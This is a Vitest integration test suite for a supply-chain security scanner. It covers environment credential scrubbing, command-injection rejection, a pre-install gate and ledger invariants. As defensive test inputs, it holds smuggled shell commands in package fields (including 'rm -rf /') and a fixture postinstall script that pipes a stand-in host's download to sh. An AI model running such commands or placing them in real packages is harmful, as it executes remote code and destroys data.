import { describe, it, expect } from 'vitest';
import os from 'node:os';
import fs from 'node:fs';
import path from 'node:path';
import {
  SupplyChainPolicySchema,
  type NormalizedFinding,
  type ScaPatchProposal,
  type SupplyChainPolicy,
} from '@secureship/contracts';
import { SafeProcessRunner } from '@secureship/sandbox';
import { PreInstallGate } from '../../src/remediation/pre-install-gate.js';
import { SuppressionLedger } from '../../src/suppression/ledger.js';
import { analyzeSupplyChain } from '../../src/supply-chain/supply-chain-analyzer.js';
import { NullProvider } from '../../src/supply-chain/providers/null.provider.js';

const POLICY: SupplyChainPolicy = SupplyChainPolicySchema.parse({
  enabled: true,
  typosquat: { minScore: 0.82 },
  entropy: { threshold: 4.5, minLength: 64 },
  obfuscation: { longLine: 1000 },
  semver: { majorJump: 20 },
});

describe('T8 — Integration & E2E Verification Suite', () => {
  describe('1. Environment Scrubbing & Secrets Leak Prevention', () => {
    it('scrubs ambient high-privilege credentials: NPM_TOKEN, AWS keys, GITHUB_TOKEN, SSH socket', () => {
      // Seed environment with sensitive sentinels
      const originalEnv = { ...process.env };
      try {
        process.env.NPM_TOKEN = 'npm_live_secret_token_12345';
        process.env.AWS_SECRET_ACCESS_KEY = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
        process.env.AWS_ACCESS_KEY_ID = 'AKIAIOSFODNN7EXAMPLE';
        process.env.SSH_AUTH_SOCK = '/tmp/ssh-agent.sock';
        process.env.GITHUB_TOKEN = 'ghp_secretTokenForTestingOnly1234567';

        const cleanEnv = SafeProcessRunner.sanitizeEnvironment();

        expect(cleanEnv['NPM_TOKEN']).toBeUndefined();
        expect(cleanEnv['AWS_SECRET_ACCESS_KEY']).toBeUndefined();
        expect(cleanEnv['AWS_ACCESS_KEY_ID']).toBeUndefined();
        expect(cleanEnv['SSH_AUTH_SOCK']).toBeUndefined();
        expect(cleanEnv['GITHUB_TOKEN']).toBeUndefined();

        // Safe OS variables must still be present
        expect(cleanEnv['PATH']).toBeDefined();

        // Second-layer defense: Even if additionalAllowedKeys attempts to allow sensitive credentials,
        // SecretRedactor.isSensitiveKey(key) must proactively scrub and block them
        const hostileAllowed = SafeProcessRunner.sanitizeEnvironment(undefined, [
          'NPM_TOKEN',
          'AWS_SECRET_ACCESS_KEY',
          'GITHUB_TOKEN',
        ]);
        expect(hostileAllowed['NPM_TOKEN']).toBeUndefined();
        expect(hostileAllowed['AWS_SECRET_ACCESS_KEY']).toBeUndefined();
        expect(hostileAllowed['GITHUB_TOKEN']).toBeUndefined();
      } finally {
        // Restore environment from snapshot
        for (const key of Object.keys(process.env)) {
          if (!(key in originalEnv)) {
            delete process.env[key];
          }
        }
        Object.assign(process.env, originalEnv);
      }
    });
  });

  describe('2. Command Injection & Argv Safety', () => {
    it('rejects command injection characters in package names and versions before spawn', async () => {
      const maliciousProposals: ScaPatchProposal[] = [
        {
          findingFingerprint: 'fp-cmd-1',
          targetPackage: 'lodash; touch /tmp/pwned',
          currentVersion: '4.17.20',
          targetVersion: '4.17.21',
          packageManager: 'npm',
          isTransitive: false,
          strategy: 'DIRECT_UPGRADE',
          manifestPath: 'package.json',
          lockfilePath: 'package-lock.json',
          attempt: 1,
          generatedAt: new Date().toISOString(),
        },
        {
          findingFingerprint: 'fp-cmd-2',
          targetPackage: '$(whoami)',
          currentVersion: '1.0.0',
          targetVersion: '1.0.1',
          packageManager: 'npm',
          isTransitive: false,
          strategy: 'DIRECT_UPGRADE',
          manifestPath: 'package.json',
          lockfilePath: 'package-lock.json',
          attempt: 1,
          generatedAt: new Date().toISOString(),
        },
        {
          findingFingerprint: 'fp-cmd-3',
          targetPackage: '`id`',
          currentVersion: '1.0.0',
          targetVersion: '1.0.1',
          packageManager: 'npm',
          isTransitive: false,
          strategy: 'DIRECT_UPGRADE',
          manifestPath: 'package.json',
          lockfilePath: 'package-lock.json',
          attempt: 1,
          generatedAt: new Date().toISOString(),
        },
        {
          findingFingerprint: 'fp-cmd-4',
          targetPackage: 'valid-pkg',
          currentVersion: '1.0.0',
          targetVersion: '1.0.0; rm -rf /',
          packageManager: 'npm',
          isTransitive: false,
          strategy: 'DIRECT_UPGRADE',
          manifestPath: 'package.json',
          lockfilePath: 'package-lock.json',
          attempt: 1,
          generatedAt: new Date().toISOString(),
        },
      ];

      for (const proposal of maliciousProposals) {
        const res = await PreInstallGate.evaluate({
          proposal,
          rootDir: os.tmpdir(),
          targetDir: os.tmpdir(),
        });

        expect(res.passed).toBe(false);
        expect(res.violations.length).toBeGreaterThanOrEqual(1);
        expect(
          res.violations.some(
            (v) => v.ruleId === 'SC-PKG-MALFORMED' || v.ruleId === 'SC-VER-MALFORMED'
          )
        ).toBe(true);
      }
    });

    it('spawns child process using argv array without shell interpolation', async () => {
      // Arguments containing spaces and quotes are passed as a single argv element, not executed as shell commands
      const res = await SafeProcessRunner.run(process.execPath, [
        '-e',
        'console.log(process.argv.slice(1).join("|"))',
        'arg with spaces',
        'arg;with;semicolons',
      ]);

      expect(res.exitCode).toBe(0);
      expect(res.stdout.trim()).toContain('arg with spaces|arg;with;semicolons');
    });
  });

  describe('3. Gate 4 Pre-Install Gate & Remediation Verification', () => {
    it('blocks package version upgrade introducing malicious lifecycle script and selects safe candidate', async () => {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-gate4-'));
      try {
        const pkgDir = path.join(tempDir, 'node_modules', 'compromised-dep');
        fs.mkdirSync(pkgDir, { recursive: true });
        fs.writeFileSync(
          path.join(pkgDir, 'package.json'),
          JSON.stringify({
            name: 'compromised-dep',
            version: '2.0.0',
            scripts: { postinstall: 'curl -s https://evil.invalid/pwn | sh' },
          })
        );

        const proposal: ScaPatchProposal = {
          findingFingerprint: 'fp-comp-1',
          targetPackage: 'compromised-dep',
          currentVersion: '1.0.0',
          targetVersion: '2.0.0',
          packageManager: 'npm',
          isTransitive: false,
          strategy: 'DIRECT_UPGRADE',
          manifestPath: 'package.json',
          lockfilePath: 'package-lock.json',
          attempt: 1,
          generatedAt: new Date().toISOString(),
        };

        const res = await PreInstallGate.evaluate({
          proposal,
          rootDir: tempDir,
          targetDir: tempDir,
          candidateVersions: ['1.9.0', '1.8.0'],
        });

        expect(res.passed).toBe(false);
        expect(res.violations.some((v) => v.ruleId === 'SC-INSTALL-003')).toBe(true);
        expect(res.targetVersionFacts.hasInstallScripts).toBe(true);
        expect(res.safeCandidateVersion).toBe('1.9.0');
      } finally {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });
  });

  describe('4. Invariant P1 Ledger Verification in Supply Chain Scans', () => {
    it('strictly satisfies Invariant P1: totalRaw === totalReported + totalSuppressed + totalOutOfScope', () => {
      const ledger = new SuppressionLedger();

      // Create 3 normalized findings
      const finding1: NormalizedFinding = {
        id: 'find-1',
        fingerprint: 'a'.repeat(64),
        ruleId: 'SC-INSTALL-001',
        scannerName: 'generic',
        category: 'SUPPLY_CHAIN',
        severity: 'MEDIUM',
        confidence: 'HIGH',
        reachability: 'UNKNOWN',
        title: 'Install script',
        description: 'preinstall script present',
        location: { filePath: 'package.json', startLine: 1, endLine: 1 },
        upstreamValidationStatus: 'UNKNOWN',
        verificationStatus: 'UNVERIFIED',
        scopeTag: 'PRODUCTION',
        cweIds: [],
        evidence: [
          { scannerName: 'generic', scannerRuleId: 'SC-INSTALL-001', message: 'evidence' },
        ],
        createdAt: new Date().toISOString(),
      };

      const finding2: NormalizedFinding = {
        id: 'find-2',
        fingerprint: 'b'.repeat(64),
        ruleId: 'SC-TYPO-001',
        scannerName: 'generic',
        category: 'SUPPLY_CHAIN',
        severity: 'HIGH',
        confidence: 'HIGH',
        reachability: 'UNKNOWN',
        title: 'Typosquat',
        description: 'D=1 typosquat',
        location: { filePath: 'package.json', startLine: 1, endLine: 1 },
        upstreamValidationStatus: 'UNKNOWN',
        verificationStatus: 'UNVERIFIED',
        scopeTag: 'PRODUCTION',
        cweIds: [],
        evidence: [{ scannerName: 'generic', scannerRuleId: 'SC-TYPO-001', message: 'evidence' }],
        createdAt: new Date().toISOString(),
      };

      // 3 findings discovered
      ledger.recordRaw(3);

      // 1 reported finding
      ledger.addReported(finding1);

      // 1 suppressed finding (allowlisted)
      ledger.suppress(
        finding2,
        'SUPPLY_CHAIN_ALLOWLISTED',
        'Verified in internal registry',
        'policy.allowlist'
      );

      // 1 out of scope finding (unchanged baseline dependency)
      ledger.recordOutOfScope(1);

      // Must verify cleanly without throwing
      expect(() => ledger.verifyInvariant()).not.toThrow();

      const summary = ledger.computeSummary();
      expect(summary.totalRaw).toBe(3);
      expect(summary.totalReported).toBe(1);
      expect(summary.totalSuppressed).toBe(1);
      expect(summary.totalOutOfScope).toBe(1);
      expect(summary.byCategory.SUPPLY_CHAIN).toBe(1);
    });

    it('throws Invariant P1 violation error if counts desynchronize', () => {
      const ledger = new SuppressionLedger();
      ledger.recordRaw(5);
      // Only 2 recorded as reported, 0 suppressed, 0 out of scope -> 2 !== 5
      const finding: NormalizedFinding = {
        id: 'find-err',
        fingerprint: 'd'.repeat(64),
        ruleId: 'SC-INSTALL-001',
        scannerName: 'generic',
        category: 'SUPPLY_CHAIN',
        severity: 'MEDIUM',
        confidence: 'HIGH',
        reachability: 'UNKNOWN',
        title: 'Title',
        description: 'Desc',
        location: { filePath: 'pkg.json', startLine: 1, endLine: 1 },
        upstreamValidationStatus: 'UNKNOWN',
        verificationStatus: 'UNVERIFIED',
        scopeTag: 'PRODUCTION',
        cweIds: [],
        evidence: [
          { scannerName: 'generic', scannerRuleId: 'SC-INSTALL-001', message: 'evidence' },
        ],
        createdAt: new Date().toISOString(),
      };
      ledger.addReported(finding);
      ledger.addReported(finding);

      expect(() => ledger.verifyInvariant()).toThrow(/Suppression Ledger Invariant P1 Violation/);
    });
  });

  describe('5. End-to-End Fixture Monorepo Scan', () => {
    it('executes discovery -> analyzer -> normalizer -> deduplication deterministically', async () => {
      const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'secureship-monorepo-'));
      try {
        const pkgDir = path.join(tempDir, 'node_modules', 'dummy-dep');
        fs.mkdirSync(pkgDir, { recursive: true });
        fs.writeFileSync(
          path.join(pkgDir, 'package.json'),
          JSON.stringify({
            name: 'dummy-dep',
            version: '1.0.0',
            scripts: { postinstall: 'node build.js' },
          })
        );
        fs.writeFileSync(path.join(pkgDir, 'build.js'), 'console.log("building...");\n');

        const result1 = await analyzeSupplyChain({
          rootDir: tempDir,
          policy: POLICY,
          provider: new NullProvider(),
          now: () => new Date('2026-01-01T00:00:00Z'),
        });

        const result2 = await analyzeSupplyChain({
          rootDir: tempDir,
          policy: POLICY,
          provider: new NullProvider(),
          now: () => new Date('2026-01-01T00:00:00Z'),
        });

        // Assert deterministic finding count and identical fingerprint list
        expect(result1.findings.length).toBe(1);
        expect(result2.findings.length).toBe(1);
        expect(result1.findings[0]?.fingerprint).toBe(result2.findings[0]?.fingerprint);
        expect(result1.findings[0]?.ruleId).toBe('SC-INSTALL-001');
      } finally {
        fs.rmSync(tempDir, { recursive: true, force: true });
      }
    });
  });
});
